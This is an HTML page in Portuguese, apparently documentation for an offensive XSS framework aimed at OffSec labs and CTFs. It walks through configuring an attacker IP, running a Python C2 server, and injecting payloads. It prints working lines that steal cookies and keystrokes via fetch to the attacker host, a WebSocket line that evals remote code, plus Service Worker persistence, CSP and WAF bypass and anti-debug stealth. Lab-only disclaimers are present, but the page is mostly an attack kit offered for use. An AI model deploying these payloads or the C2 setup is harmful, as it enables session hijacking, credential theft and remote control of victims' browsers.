<h1>OFFSEC XSS EXPLOIT FRAMEWORK <span>v9.99 PRO</span></h1>
      <p class="subtitle">O XSS mais avançado já criado para Labs OffSec (OSCP, OSEP, CTF)</p>
      <p><span class="badge">900+ linhas</span><span class="badge">80+ payloads</span><span class="badge">7 métodos de persistência</span><span class="badge">C2</span><span class="badge">Stealth</span><span class="badge">Bypass WAF</span></p>
      <div class="warning">
        <strong>USO EXCLUSIVO EM LABORATÓRIOS OFFSEC COM PERMISSÃO</strong><br>
        <strong>NÃO USE EM AMBIENTES REAIS – É ILEGAL</strong>
      </div>
    </header>

    <nav>
      <ul>
        <li><a href="#visao-geral">1. Visão Geral</a></li>
        <li><a href="#funcionalidades">2. Funcionalidades</a></li>
        <li><a href="#requisitos">3. Requisitos</a></li>
        <li><a href="#configuracao">4. Configuração</a></li>
        <li><a href="#execucao">5. Como Executar</a></li>
        <li><a href="#estrutura">6. Estrutura do Payload</a></li>
        <li><a href="#servidor-c2">7. Servidor C2</a></li>
        <li><a href="#injecao">8. Injeção do XSS</a></li>
        <li><a href="#recebendo-dados">9. Recebendo Dados</a></li>
        <li><a href="#comandos-c2">10. Comandos C2</a></li>
        <li><a href="#persistencia">11. Persistência</a></li>
        <li><a href="#stealth">12. Stealth & Bypass</a></li>
        <li><a href="#exemplos">13. Exemplos</a></li>
        <li><a href="#dicas">14. Dicas OffSec</a></li>
        <li><a href="#faq">15. FAQ</a></li>
        <li><a href="#licenca">16. Licença</a></li>
      </ul>
    </nav>

    <section id="visao-geral">
      <h2>1. Visão Geral</h2>
      <p>Este é um <strong>framework de ataque XSS avançado</strong> projetado para <strong>dominar laboratórios OffSec</strong> com:</p>
      <ul>
        <li>Coleta massiva de dados (cookies, localStorage, fingerprinting, etc.)</li>
        <li>Exfiltração por 14+ métodos</li>
        <li>Persistência em 7 storages</li>
        <li>C2 com polling e execução remota</li>
        <li>Bypass de WAFs, CSP, filtros</li>
        <li>Totalmente stealth (anti-debug, jitter, encodings)</li>
      </ul>
    </section>

    <section id="funcionalidades">
      <h2>2. Funcionalidades</h2>
      <table>
        <thead>
          <tr><th>Categoria</th><th>Detalhes</th></tr>
        </thead>
        <tbody>
          <tr><td><strong>Coleta</strong></td><td>80+ fontes: cookies, localStorage, IndexedDB, WebSQL, Canvas FP, WebGL, Audio FP, WebRTC IP, formulários, iframes, etc.</td></tr>
          <tr><td><strong>Exfiltração</strong></td><td><code>fetch</code>, <code>img</code>, <code>beacon</code>, <code>WebSocket</code>, <code>CSS</code>, <code>iframe</code>, <code>postMessage</code>, <code>DNS prefetch</code>, etc.</td></tr>
          <tr><td><strong>Persistência</strong></td><td><code>localStorage</code>, <code>cookies</code>, <code>IndexedDB</code>, <code>Service Worker</code>, <code>Cache API</code>, <code>WebSQL</code></td></tr>
          <tr><td><strong>C2</strong></td><td>Polling em <code>/cmd</code>, execução remota de JS</td></tr>
          <tr><td><strong>Stealth</strong></td><td>Jitter, encodings múltiplos, anti-debug, remoção de rastros</td></tr>
          <tr><td><strong>Hooks</strong></td><td>Keylogger, form sniffing, clipboard, mouse trail, navegação</td></tr>
        </tbody>
      </table>
    </section>

    <section id="requisitos">
      <h2>3. Requisitos</h2>
      <table>
        <thead>
          <tr><th>Item</th><th>Versão</th></tr>
        </thead>
        <tbody>
          <tr><td><strong>Sistema</strong></td><td>Kali Linux (recomendado)</td></tr>
          <tr><td><strong>Python</strong></td><td>3.8+</td></tr>
          <tr><td><strong>Navegador</strong></td><td>Chrome/Firefox (na máquina vítima)</td></tr>
          <tr><td><strong>Ferramentas</strong></td><td><code>python3</code>, <code>base64</code>, <code>curl</code>, <code>nc</code></td></tr>
        </tbody>
      </table>
    </section>

    <section id="configuracao">
      <h2>4. Configuração</h2>
      <ol>
        <li><strong>Abra o código JS</strong></li>
        <li><strong>Edite a linha:</strong></li>
      </ol>
      <pre><code class="highlight">ATTACKER_IP: '10.10.14.XX',  // ← SUBSTITUA POR SEU IP DO TUN0</code></pre>
      <pre><code class="cmd">ifconfig tun0  # ou: ip a</code></pre>
      <p><strong>Exemplo:</strong> <code>10.10.14.37</code></p>
    </section>

    <section id="execucao">
      <h2>5. Como Executar (Passo a Passo)</h2>

      <h3>PASSO 1: Inicie o Servidor C2</h3>
      <pre><code class="cmd">cd /tmp
python3 -m http.server 80</code></pre>
      <p><strong>Endpoints criados:</strong></p>
      <ul>
        <li><code>http://10.10.14.37:80/collect</code></li>
        <li><code>http://10.10.14.37:80/cmd</code></li>
        <li><code>http://10.10.14.37:80/beacon.gif</code></li>
      </ul>

      <h3>PASSO 2: Minifique o Payload</h3>
      <ol>
        <li><strong>Salve o código:</strong></li>
        <pre><code class="cmd">nano xss_framework.js
# → Cole todo o código JS
# → Salve: Ctrl+O → Enter → Ctrl+X</code></pre>
        <li><strong>Minifique (online):</strong></li>
        <ol>
          <li>Acesse: <a href="https://www.toptal.com/developers/javascript-minifier" target="_blank">https://www.toptal.com/developers/javascript-minifier</a></li>
          <li>Cole o conteúdo</li>
          <li>Clique em "Minify"</li>
          <li>Copie o resultado → <code>xss_minified.js</code></li>
        </ol>
        <li><strong>Gere Base64 (opcional):</strong></li>
        <pre><code class="cmd">cat xss_minified.js | base64 -w 0 > payload_b64.txt</code></pre>
      </ol>

      <h3>PASSO 3: Injete o XSS</h3>
      <p><strong>Método 1: Injeção direta</strong></p>
      <pre><code class="highlight">"><script>[COLE_AQUI_O_MINIFICADO]</script></code></pre>

      <p><strong>Método 2: Data URI (bypass de filtros)</strong></p>
      <pre><code class="highlight">"><script src="data:text/javascript;base64,[BASE64_DO_MINIFICADO]"></script></code></pre>

      <p><strong>Exemplo final:</strong></p>
      <pre><code class="highlight">"><script src="data:text/javascript;base64,KGZ1bmN0aW9uKCl7J3VzZSBzdHJpY3QnO2NvbnN0IENPTkZJRz17QVRUQUNLRVJfSVA6JzEwLjEwLjE0LjM3J..."></script></code></pre>

      <h3>PASSO 4: Receba os Dados</h3>
      <pre><code class="cmd">tail -f access.log
# ou use o server.py com logs bonitos</code></pre>
      <p><strong>Você verá:</strong></p>
      <pre><code class="cmd">[COLLECT] eyJpZCI6IjEyMzQ1IiwidXJsIjoiaHR0cDovL3...</code></pre>
      <p><strong>Decodifique:</strong></p>
      <pre><code class="cmd">echo "eyJpZCI6..." | base64 -d | jq</code></pre>

      <h3>PASSO 5: Envie Comandos Remotos</h3>
      <pre><code class="cmd">echo '[{"id":"cmd1","code":"alert(document.cookie)"}]' > cmd</code></pre>
      <p>O payload buscará automaticamente em:</p>
      <pre><code class="highlight">http://10.10.14.37:80/cmd</code></pre>
    </section>

    <section id="estrutura">
      <h2>6. Estrutura do Payload</h2>
      <pre><code class="highlight">(function() {
    'use strict';
    const CONFIG = { ATTACKER_IP: '10.10.14.37', ... };
    const Utils = { ... };
    class OffsecXSS { ... }
    new OffsecXSS();
})();</code></pre>
      <ul>
        <li><strong>IIFE:</strong> Executa imediatamente</li>
        <li><strong>Stealth:</strong> Remove rastros do <code>window</code></li>
        <li><strong>Jitter:</strong> Evita detecção por timing</li>
      </ul>
    </section>

    <section id="servidor-c2">
      <h2>7. Servidor C2 (Python) – Versão Avançada</h2>
      <pre><code class="cmd">nano c2_server.py</code></pre>
      <pre><code class="highlight">from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import json, base64, datetime, os

class C2Handler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Silencia logs padrão

    def do_GET(self):
        if '/collect' in self.path:
            params = parse_qs(self.path.split('?')[1] if '?' in self.path else '')
            data = params.get('d', [''])[0]
            try:
                decoded = base64.b64decode(data).decode('utf-8', 'ignore')
                print(f"\n[{datetime.datetime.now()}] [COLLECT] {decoded[:200]}...")
            except:
                print(f"\n[RAW] {data[:200]}...")
            self.send_response(200)
            self.end_headers()

        elif '/cmd' in self.path:
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(open('cmd', 'rb').read() if os.path.exists('cmd') else b'[]')

        elif '/beacon.gif' in self.path:
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.end_headers()
            self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')

        else:
            self.send_response(404)
            self.end_headers()

print("C2 Server ON → http://0.0.0.0:80")
HTTPServer(('', 80), C2Handler).serve_forever()</code></pre>
      <pre><code class="cmd">python3 c2_server.py</code></pre>
    </section>

    <section id="injecao">
      <h2>8. Injeção do XSS</h2>
      <table>
        <thead>
          <tr><th>Tipo</th><th>Payload</th></tr>
        </thead>
        <tbody>
          <tr><td><strong>Refletido</strong></td><td><code>"><script>alert(1)</script></code></td></tr>
          <tr><td><strong>Armazenado</strong></td><td><code>"><img src=x onerror=fetch('http://10.10.14.37/collect?c='+document.cookie)></code></td></tr>
          <tr><td><strong>DOM-based</strong></td><td><code>javascript:fetch('http://10.10.14.37/collect?c='+document.cookie)</code></td></tr>
          <tr><td><strong>Bypass CSP</strong></td><td><code><script src="data:text/javascript;base64,..."></script></code></td></tr>
        </tbody>
      </table>
    </section>

    <section id="recebendo-dados">
      <h2>9. Recebendo Dados</h2>
      <pre><code class="highlight">{
  "id": "abc123",
  "url": "http://lab.offsec/xss.php",
  "cookies": "PHPSESSID=abc123; user=admin",
  "localStorage": "{\"token\":\"abc123\"}",
  "canvas": "data:image/png;base64,iVBORw0KGgo...",
  "webRTC": ["192.168.1.100"]
}</code></pre>
    </section>

    <section id="comandos-c2">
      <h2>10. Comandos Remotos (C2)</h2>
      <pre><code class="highlight">// cmd
[
  {
    "id": "cmd1",
    "code": "fetch('http://10.10.14.37/log?c='+document.cookie)"
  },
  {
    "id": "cmd2",
    "code": "new Image().src='http://10.10.14.37/beacon.gif?screen='+screen.width"
  }
]</code></pre>
    </section>

    <section id="persistencia">
      <h2>11. Persistência</h2>
      <table>
        <thead>
          <tr><th>Método</th><th>Teste</th></tr>
        </thead>
        <tbody>
          <tr><td><code>localStorage</code></td><td>F5 → ainda ativo</td></tr>
          <tr><td><code>IndexedDB</code></td><td>Recarrega → persiste</td></tr>
          <tr><td><code>Service Worker</code></td><td>Navegador fechado → reabre → ativo</td></tr>
        </tbody>
      </table>
    </section>

    <section id="stealth">
      <h2>12. Stealth & Bypass</h2>
      <table>
        <thead>
          <tr><th>Técnica</th><th>Uso</th></tr>
        </thead>
        <tbody>
          <tr><td><strong>Jitter</strong></td><td><code>setInterval(..., 800 ± 30%)</code></td></tr>
          <tr><td><strong>Encodings</strong></td><td>base64, rot13, gzip, hex</td></tr>
          <tr><td><strong>Anti-debug</strong></td><td><code>delete window.OffsecXSS</code></td></tr>
          <tr><td><strong>CSP Bypass</strong></td><td><code>data:</code>, <code>blob:</code>, <code>postMessage</code></td></tr>
        </tbody>
      </table>
    </section>

    <section id="exemplos">
      <h2>13. Exemplos Práticos</h2>

      <h3>1. Roubar Cookies</h3>
      <pre><code class="highlight">fetch('http://10.10.14.37/collect?c='+document.cookie)</code></pre>

      <h3>2. Keylogger</h3>
      <pre><code class="highlight">document.onkeydown = e => fetch('http://10.10.14.37/log?k='+e.key)</code></pre>

      <h3>3. Reverse Shell via XSS</h3>
      <pre><code class="highlight">new WebSocket('ws://10.10.14.37:4444').onmessage = e => eval(e.data)</code></pre>
    </section>

    <section id="dicas">
      <h2>14. Dicas OffSec</h2>
      <table>
        <thead>
          <tr><th>Dica</th><th>Comando</th></tr>
        </thead>
        <tbody>
          <tr><td>Teste local</td><td><code>python3 -m http.server 8000</code></td></tr>
          <tr><td>Use ngrok</td><td><code>ngrok http 80</code></td></tr>
          <tr><td>Bypass WAF</td><td><code>rot13</code>, <code>gzip</code>, <code>data:</code></td></tr>
          <tr><td>Persistência</td><td>F5 → ainda ativo</td></tr>
          <tr><td>Keylogger</td><td>Digite → veja no log</td></tr>
        </tbody>
      </table>
    </section>

    <section id="faq">
      <h2>15. FAQ</h2>
      <ul>
        <li><strong>P: O payload não executa?</strong><br><strong>R:</strong> Verifique se o campo reflete o <code>&lt;script&gt;</code> sem filtros.</li>
        <li><strong>P: Não recebo dados?</strong><br><strong>R:</strong> Use <code>curl</code> para testar: <code>curl http://10.10.14.37:80/collect</code></li>
        <li><strong>P: CSP bloqueia?</strong><br><strong>R:</strong> Use <code>data:</code> ou <code>postMessage</code></li>
      </ul>
    </section>

    <section id="licenca">
      <h2>16. Licença</h2>
      <div class="warning">
        <pre><code>USO EXCLUSIVO EM LABORATÓRIOS OFFSEC COM PERMISSÃO
PROIBIDO EM AMBIENTES REAIS</code></pre>
      </div>
    </section>

    <footer class="footer">
      <p><strong>AUTOR:</strong></p>
      <p><em>AnonPro – Futuro OSCP Pro</em></p>
      <p>"Não é só XSS. É dominação."</p>
      <hr>
      <h3>PRONTO PARA DOMINAR?</h3>
      <p>Injete. Espere. Receba. Root.</p>
      <pre><code class="cmd"># Seu comando final:
echo '"><script src="data:text/javascript;base64,$(cat xss_minified.js | base64 -w 0)</script>' | xclip -sel clip</code></pre>
      <p><strong>Cole no campo vulnerável. Aguarde 3 segundos.</strong></p>
      <p><strong>Root incoming.</strong></p>
    </footer>
  </div>
